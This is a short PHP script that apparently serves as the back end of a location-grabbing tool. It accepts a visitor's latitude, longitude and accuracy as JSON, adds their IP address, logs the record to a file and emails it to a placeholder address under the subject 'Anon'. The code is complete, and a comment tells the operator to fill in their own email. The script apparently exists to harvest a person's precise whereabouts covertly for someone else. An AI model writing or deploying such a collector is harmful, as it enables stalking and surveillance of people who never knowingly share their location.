<?php

mb_internal_encoding('UTF-8');

if($_SERVER["CONTENT_TYPE"] ==  'application/json') {
    $data = file_get_contents('php://input');
    $coordinates = json_decode($data, true);

    if(isset($coordinates['lat'], $coordinates['lon'], $coordinates['accuracy'])) {
        $msg = 'lat: ' . floatval($coordinates['lat']) . "\n" .
            'lon: ' . floatval($coordinates['lon']) . "\n" .
            'acc: ' . intval($coordinates['accuracy']) . "\n" . 
            'ip: ' . $_SERVER['REMOTE_ADDR'];
        $file = fopen('logs.txt', 'a') ;
        $ms = PHP_EOL.$msg ;
        fwrite($file, $ms) ;
        fclose($file);
            //enter your email below
        mail('youremail@gmail.com', 'Anon', $msg);
    }
}
?>
